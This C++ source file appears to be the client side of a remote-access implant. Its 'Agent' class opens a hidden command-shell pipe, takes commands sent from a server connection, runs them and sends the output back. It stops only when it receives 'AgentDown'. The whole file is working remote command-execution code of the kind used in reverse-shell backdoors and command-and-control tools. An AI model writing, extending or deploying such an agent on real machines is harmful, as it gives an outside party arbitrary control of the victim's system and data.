#include "Agent.h"

void Agent::OnConnect(Connection connection)
{
	Packet packet;
	console.Cmd2Buffer();

	std::string message = console.GetCmdOutput();

	packet.InsertString(message);
	connection.Send(packet);
}


bool Agent::Initialize()
{
	if (not console.InitializeCmdPipe())
	{
		std::cerr << "Error at InitializeCmdPipe." << std::endl;
		return false;
	}

	if (not console.Launch())
	{
		std::cerr << "Error at Launch." << std::endl;
		console.Close();
		return false;
	}
	
	return true;
}

bool Agent::ShutDown()
{
	if (not connSocket.Close())
	{
		std::cerr << "Error at Close." << std::endl;
		return false;
	}

	if (not console.Close())
	{
		std::cerr << "Error at Close." << std::endl;
		return false;
	}

	return true;
}

bool Agent::Logic()
{
	Packet packet;
	
	if (not serverConn.Recv(packet))
	{
		std::cerr << "Agent::Logic::Recv Error." << std::endl;
		return false;
	}
	
	std::string msg = packet.ExtractString() + '\n';

	if (msg == "AgentDown\n")
	{
		std::cout << "[+] Shutting down agent..." << std::endl;
		return false;
	}

	if (not console.Buffer2Cmd(msg))
	{
		std::cerr << "Agent::Logic::Buffer2Cmd Error." << std::endl;
		return false;
	}
	
	if (not console.Cmd2Buffer())
	{
		std::cerr << "Agent::Logic::Cmd2Buffer Error." << std::endl;
		return false;
	}
	
	std::string cmdOutput = console.GetCmdOutput();

	packet.Clear();
	packet.InsertString(cmdOutput);

	if (not serverConn.Send(packet))
	{
		std::cerr << "Agent::Logic::Send Error." << std::endl;
		return false;
	}

	return true;
}
